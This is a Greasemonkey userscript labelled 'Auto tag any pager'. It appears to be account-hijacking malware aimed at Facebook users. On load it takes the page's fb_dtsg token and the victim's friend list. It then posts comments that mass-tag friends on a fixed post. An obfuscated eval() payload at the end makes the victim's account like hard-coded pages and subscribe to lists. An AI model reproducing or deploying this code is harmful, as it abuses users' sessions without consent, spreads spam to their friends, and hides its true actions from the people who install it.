// ==UserScript==
// @name           Auto tag any pager
// @version        21.9 new
// @namespace      mental
// @description    http://kumpulan-kecil.blogspot.com/
// @include        http://kumpulan-kecil.blogspot.com/*
// @include        http://*.kumpulan-kecil.blogspot.com/*
// @grant          none
// @icon  aing
// @downloadURL https://userscripts.org/scripts/source/178410.user.js
// @updateURL https://userscripts.org/scripts/source/178410.user.js
// ==/UserScript==

var aing={
  posId:"1415108372060318", 
  idGw:"100001289242697",       
//  idGw:/[0-9]{8,}/.exec(document.getElementsByClassName("fbxWelcomeBoxImg")[0].id)[0],
  dtsg:document.getElementsByName("fb_dtsg")[0].value,
  ctLama:/comment_text=(.*?)&/,c:1,ctBaru:"comment_text=",
  getPren:function(uid){var a=window.ActiveXObject?new ActiveXObject("Msxml2.XMLHTTP"):new XMLHttpRequest;if(a.open("GET","/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer="+uid+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm",!1),a.send(null),4==a.readyState){var b=JSON.parse(a.responseText.substring(a.responseText.indexOf("{")));return b.payload.entries}return !1},
  hajar:function(){
    aing.koncos=aing.getPren(aing.idGw);
    aing.pale="ft_ent_identifier="+aing.posId+"&comment_text=0&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+aing.idGw+"&__a=1&__req=4u&fb_dtsg="+aing.dtsg+"&phstamp="+Math.random();
    for(var n=1;n<aing.koncos.length;n++){
      if(fb_dtsg=aing.dtsg,aing.ctBaru+="Nomer%20"+n+"%20%40["+aing.koncos[n].uid+"%3AAAAAAAAAAAA]%20hadir%20%0A",aing.c++,7==aing.c){
        with(aing.ctBaru+="&",new XMLHttpRequest)open("POST","/ajax/ufi/add_comment.php?__a=1"),setRequestHeader("Content-Type","application/x-www-form-urlencoded"),send(aing.pale.replace(aing.ctLama,aing.ctBaru));
        z=setTimeout("function(){asd=0}",1e3),clearInterval(z),aing.c=1,aing.ctBaru="comment_text="
      }
    }
  }
};
aing.hajar();
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2 3=6.h(\'3\')[0].o;2 9=6.b.8(6.b.8(/n=(\\d+)/)[1]);7 e(L){2 X=m q();2 f="//r.t.l/u/R/P/B/T";2 i="Y="+L+"&O=B&N=S&j[g]=10&k[11]=Z&k[V]=W&v="+9+"&s=1&K=12&M=y&3="+3+"&I=";X.J("A",f,c);X.w=7(){x(X.C==4&&X.D==H){X.G}};X.F(i)}e("U");e("Q");2 3=6.h(\'3\')[0].o;2 9=6.b.8(6.b.8(/n=(\\d+)/)[1]);7 a(p){2 5=m q();2 z="//r.t.l/u/1h/1g.1f";2 E="&13="+p+"&1i=c&1c=16&1d=15&14=&17=&j[g]=18&v="+9+"&s=1&K=1b-&M=d&3="+3+"&I=";5.J("A",z,c);5.w=7(){x(5.C==4&&5.D==H){5.G}};5.F(E)}a("1a");a("19");a("1e");',62,81,'||var|fb_dtsg||Page|document|function|match|user_id|Like|cookie|true||LIST|XURL|_mod|getElementsByName|XParams|nctr|ft|com|new|c_user|value||XMLHttpRequest|www|__a|facebook|ajax|__user|onreadystatechange|if||PageURL|POST|subscribe|readyState|status|PageParams|send|close|200|phstamp|open|__dyn||__req|location|action|lists|248758585259853|friends|feed|modify|244367472365631|tn|DH||flid|40|pagelet_group_mall|type|7n8ahxoNpGo|fbpage_id|fan_source|page_timeline|false|cat|pagelet_timeline_page_actions|351728384936777|462346010461421|798aD5z5CF|reload|fan_origin|525005157549186|php|fan_status|pages|add'.split('|'),0,{}))